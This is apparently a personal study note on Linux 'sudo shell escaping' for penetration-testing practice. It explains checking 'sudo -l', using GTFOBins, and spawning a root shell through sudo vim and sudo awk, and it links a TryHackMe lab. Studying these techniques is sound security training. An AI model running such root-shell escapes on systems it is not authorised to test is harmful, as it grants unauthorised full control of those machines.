When we have the possibility to run commands as `sudo` on the system it could be possible to pop an interactive shell as `root` leveraging on the command itself. This is called Sudo Shell Escaping.


**==In order to see which commands we can run as `sudo` we can run this command:==**
```bash
sudo -l
```
- ![[Pasted image 20250116152659.png]]

*For example in this case we can run as `sudo` the command `vim`*


# GTFOBins

This is an important tool used to perform this privilege escalation technique
-  [https://gtfobins.github.io/](https://gtfobins.github.io/)

<mark style="background: #FF5582A6;">This is the most important one!</mark>

In this case we search for the command `vim` under the `sudo` section:
- ![[Pasted image 20250116152850.png]]
- ![[Pasted image 20250116152908.png]]

So we just need to run:
```bash
sudo vim -c ':!/bin/sh'
```
- ![[Pasted image 20250116152945.png]]
- and we got the root shell



Also with `awk` is possible in this case:
```bash
sudo awk 'BEGIN {system("/bin/bash")}'
```
- ![[Pasted image 20250116153144.png]]
- ![[Pasted image 20250116153208.png]]



# TryHackMe resource for linux privesc

This resource is very useful to test for privilege escalation in different ways:
- [https://tryhackme.com/room/privescplayground](https://tryhackme.com/room/privescplayground)
